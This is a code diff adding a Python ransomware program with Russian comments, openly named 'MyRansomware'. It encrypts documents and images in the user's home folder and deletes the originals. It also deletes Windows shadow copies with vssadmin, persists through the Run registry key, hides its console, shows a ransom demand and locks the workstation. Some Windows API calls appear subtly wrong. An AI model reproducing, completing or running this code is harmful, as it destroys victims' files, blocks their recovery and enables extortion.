@@ -1,0 +1,203 @@
+
+import os, sys, time, threading, random, base64, uuid
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+import win32gui, win32con, win32api # Для Windows-специфичных операций
+
+#-----Конфигурация-----
+TARGET_DIRECTORY = os.path.expanduser("~") # Шифруем домашнюю директорию пользователя по умолчанию. Изменить по необходимости
+FILE_EXTENSIONS = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.jpeg', '.png', '.gif'] # Список расширений файлов для шифрования
+ENCRYPTION_THREADS = 10 # Количество потоков для шифрования
+KEY_ROTATION_INTERVAL = 60 # Период ротации ключа (секунды)
+
+#-----Генерация ключей RSA-----
+def generate_rsa_keypair():
+    private_key = rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=2048,
+        backend=default_backend()
+    )
+    public_key = private_key.public_key()
+
+    private_pem = private_key.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.PKCS8,
+        encryption_algorithm=serialization.NoEncryption()
+    )
+    public_pem = public_key.public_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PublicFormat.SubjectPublicKeyInfo
+    )
+
+    return private_pem, public_pem
+
+private_key, public_key = generate_rsa_keypair()
+
+#-----Сохранение ключей в файл (ОПАСНО! НУЖНО ДЛЯ ТЕСТОВ, НО НИКОГДА НЕ ДЕЛАЙ ЭТО В РЕАЛЬНОМ ВЫМОГАТЕЛЕ!)-----
+def save_keys_to_file(private_key, public_key):
+    with open('private_key.pem', 'wb') as f:
+        f.write(private_key)
+    with open('public_key.pem', 'wb') as f:
+        f.write(public_key)
+
+#save_keys_to_file(private_key, public_key) # Раскомментируй для сохранения (ТОЛЬКО ДЛЯ ТЕСТОВ!!!)
+
+#-----Загрузка ключей из файла (ДЛЯ ТЕСТОВ)-----
+def load_keys_from_file():
+    with open('private_key.pem', 'rb') as f:
+        private_key = f.read()
+    with open('public_key.pem', 'rb') as f:
+        public_key = f.read()
+    return private_key, public_key
+
+#private_key, public_key = load_keys_from_file() # Раскомментируй для загрузки (ТОЛЬКО ДЛЯ ТЕСТОВ!!!)
+
+#-----Создание производного ключа Fernet из публичного ключа RSA-----
+def derive_fernet_key(public_key, salt):
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32, # Длина ключа Fernet (32 байта)
+        salt=salt,
+        iterations=390000, # Важно для защиты от атак перебором
+        backend=default_backend()
+    )
+    return base64.urlsafe_b64encode(kdf.derive(public_key))
+
+#-----Функция шифрования файла-----
+def encrypt_file(filepath, fernet_key):
+    try:
+        with open(filepath, 'rb') as f:
+            data = f.read()
+        fernet = Fernet(fernet_key)
+        encrypted_data = fernet.encrypt(data)
+
+        with open(filepath + '.encrypted', 'wb') as f: # Добавляем расширение .encrypted
+            f.write(encrypted_data)
+
+        os.remove(filepath) # Удаляем исходный файл!
+        return True # Успешно зашифрован
+
+    except Exception as e:
+        print(f"Ошибка при шифровании {filepath}: {e}")
+        return False # Ошибка при шифровании
+
+#-----Функция расшифровки файла-----
+def decrypt_file(filepath, fernet_key):
+    try:
+        if not filepath.endswith('.encrypted'): # Проверяем, зашифрован ли файл
+            return False
+
+        with open(filepath, 'rb') as f:
+            encrypted_data = f.read()
+
+        fernet = Fernet(fernet_key)
+        decrypted_data = fernet.decrypt(encrypted_data)
+
+        filepath_original = filepath[:-len('.encrypted')] # Удаляем расширение .encrypted
+
+        with open(filepath_original, 'wb') as f:
+            f.write(decrypted_data)
+
+        os.remove(filepath) # Удаляем зашифрованный файл
+        return True # Успешно расшифрован
+
+    except Exception as e:
+        print(f"Ошибка при расшифровке {filepath}: {e}")
+        return False # Ошибка при расшифровке
+
+#-----Функция рекурсивного поиска файлов-----
+def find_target_files(directory, extensions):
+    target_files = []
+    for root, _, files in os.walk(directory):
+        for file in files:
+            if any(file.endswith(ext) for ext in extensions): # Проверяем расширение
+                filepath = os.path.join(root, file)
+                target_files.append(filepath)
+    return target_files
+
+#-----Поток шифрования-----
+def encryption_thread(file_queue, fernet_key):
+    while True:
+        try:
+            filepath = file_queue.get(timeout=5) # Ждем файл из очереди (максимум 5 секунд)
+            success = encrypt_file(filepath, fernet_key)
+            if success:
+                print(f"Зашифрован: {filepath}")
+            else:
+                print(f"Ошибка при шифровании: {filepath}")
+
+            file_queue.task_done() # Сообщаем, что задача выполнена
+        except Exception as e: # Обработка исключений (например, пустая очередь)
+            break # Завершаем поток
+
+#-----Функция удаления теневых копий-----
+def delete_shadow_copies():
+    try:
+        os.system('vssadmin delete shadows /all /quiet')
+        print("Теневые копии удалены.")
+    except Exception as e:
+        print(f"Ошибка при удалении теневых копий: {e}")
+
+#-----Установка в автозагрузку (Windows)-----
+def add_to_startup():
+    try:
+        key = win32gui.OpenKey(win32con.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, win32con.KEY_ALL_ACCESS)
+        win32gui.SetValueEx(key, "MyRansomware", 0, win32con.REG_SZ, os.path.abspath(sys.executable))
+        win32gui.CloseKey(key)
+        print("Добавлено в автозагрузку.")
+    except Exception as e:
+        print(f"Ошибка при добавлении в автозагрузку: {e}")
+
+#-----Скрытие окна консоли (Windows)-----
+def hide_console():
+    try:
+        window = win32gui.GetConsoleWindow()
+        win32gui.ShowWindow(window, win32con.SW_HIDE)
+        print("Окно консоли скрыто.")
+    except Exception as e:
+        print(f"Ошибка при скрытии окна консоли: {e}")
+
+#-----Главная функция-----
+def main():
+    hide_console() # Скрываем консоль (если это Windows)
+    add_to_startup() # Добавляем в автозагрузку
+
+    delete_shadow_copies() # Удаляем теневые копии для усложнения восстановления
+
+    #-----Создание очереди файлов для шифрования-----
+    import queue
+    file_queue = queue.Queue()
+
+    target_files = find_target_files(TARGET_DIRECTORY, FILE_EXTENSIONS)
+
+    for file in target_files:
+        file_queue.put(file)
+
+    #-----Запуск потоков шифрования-----
+    salt = os.urandom(16) # Создаем соль для производного ключа
+    fernet_key = derive_fernet_key(public_key, salt) # Создаем ключ Fernet на основе публичного ключа RSA
+
+    threads = []
+    for _ in range(ENCRYPTION_THREADS):
+        thread = threading.Thread(target=encryption_thread, args=(file_queue, fernet_key))
+        thread.daemon = True # Завершаем поток вместе с основной программой
+        threads.append(thread)
+        thread.start()
+
+    #-----Ожидание завершения шифрования-----
+    file_queue.join() # Ожидаем, пока все файлы не будут обработаны
+
+    #-----Сообщение о выкупе (Тут нужно сделать нормальное сообщение с инструкциями по оплате выкупа)-----
+    print("Все файлы зашифрованы! Свяжитесь с нами по электронной почте: badguy@example.com для получения инструкций по оплате выкупа.")
+
+    #-----Блокировка экрана (только для Windows)-----
+    win32api.MessageBox(0, "Все ваши файлы были зашифрованы. Для получения инструкций обратитесь по адресу badguy@example.com.", "Внимание!", win32con.MB_ICONERROR | win32con.MB_OK)
+    win32api.LockWorkStation() # Блокируем рабочую станцию (Windows)
+
+#-----Запуск-----
+if __name__ == "__main__":
+    main()
